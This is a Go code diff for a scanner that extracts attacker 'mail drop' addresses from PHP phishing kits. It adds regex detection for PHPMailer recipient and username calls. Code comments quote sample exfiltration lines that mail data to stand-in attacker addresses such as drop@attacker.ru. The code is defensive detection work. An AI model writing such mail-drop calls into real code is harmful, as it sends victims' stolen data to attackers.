@@ -14,8 +14,8 @@ import (
 //
 // Two patterns we resolve today:
 //
-//   1. Literal: mail("drop@attacker.ru", ...)
-//   2. Assigned-then-passed: $to = "drop@attacker.ru"; mail($to, ...)
+//  1. Literal: mail("drop@attacker.ru", ...)
+//  2. Assigned-then-passed: $to = "drop@attacker.ru"; mail($to, ...)
 //
 // What's deliberately out of scope for now:
 //   - base64_decode / str_rot13 / chr() obfuscation of the recipient
@@ -29,36 +29,55 @@ var (
 		`(?i)(?:^|[^a-zA-Z0-9_$])@?(?:mb_send_mail|wp_mail|mail)\s*\(\s*([^,)]+?)\s*,`)
 	strictEmailPattern = regexp.MustCompile(
 		`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z]{2,}$`)
+	// PHPMailer / SMTP-style exfil. Many kits send via PHPMailer rather than
+	// PHP's mail(): the recipient is ->addAddress()/->addCC()/->addBCC(), and
+	// the attacker's own sending account is ->setFrom()/->Username. All are
+	// attacker-controlled identities worth capturing as mail drops. First arg
+	// only; resolved literal-or-variable like the mail() path.
+	phpMailerRecipientPattern = regexp.MustCompile(
+		`(?i)->\s*(?:addAddress|addCC|addBCC|setFrom)\s*\(\s*([^,)]+?)\s*[,)]`)
+	phpMailerUserPattern = regexp.MustCompile(
+		`(?i)->\s*Username\s*=\s*([^;]+?)\s*;`)
 )
 
 // scanMailDropsInto finds confirmed mail-exfil recipients in content
 // and adds them to drops. Variable references are resolved against
 // assignments in the same content (per-file scope).
 func scanMailDropsInto(content []byte, drops map[string]struct{}) {
-	for _, m := range mailCallPattern.FindAllSubmatch(content, -1) {
-		if len(m) < 2 {
-			continue
-		}
-		arg := strings.TrimSpace(string(m[1]))
-		if arg == "" {
-			continue
-		}
-
-		// Case 1: literal string argument.
-		if val, ok := parseStringLiteral(arg); ok {
-			addIfMailDrop(val, drops)
-			continue
-		}
-
-		// Case 2: variable reference — resolve against same-file assignments.
-		if strings.HasPrefix(arg, "$") {
-			varName := variableHead(arg)
-			if varName == "" {
+	patterns := []*regexp.Regexp{
+		mailCallPattern,           // mail() / wp_mail() / mb_send_mail()
+		phpMailerRecipientPattern, // ->addAddress/addCC/addBCC/setFrom(...)
+		phpMailerUserPattern,      // ->Username = ...
+	}
+	for _, p := range patterns {
+		for _, m := range p.FindAllSubmatch(content, -1) {
+			if len(m) < 2 {
 				continue
 			}
-			for _, val := range findAssignments(content, varName) {
-				addIfMailDrop(val, drops)
-			}
+			resolveMailArg(content, strings.TrimSpace(string(m[1])), drops)
+		}
+	}
+}
+
+// resolveMailArg turns a captured first-argument expression into a mail drop:
+// a "..."/'...' literal directly, or a $var resolved against same-file string
+// assignments (e.g. `$to = "drop@bad.com"; mail($to, ...)` or PHPMailer's
+// `$m->addAddress($to)`).
+func resolveMailArg(content []byte, arg string, drops map[string]struct{}) {
+	if arg == "" {
+		return
+	}
+	if val, ok := parseStringLiteral(arg); ok {
+		addIfMailDrop(val, drops)
+		return
+	}
+	if strings.HasPrefix(arg, "$") {
+		varName := variableHead(arg)
+		if varName == "" {
+			return
+		}
+		for _, val := range findAssignments(content, varName) {
+			addIfMailDrop(val, drops)
 		}
 	}
 }
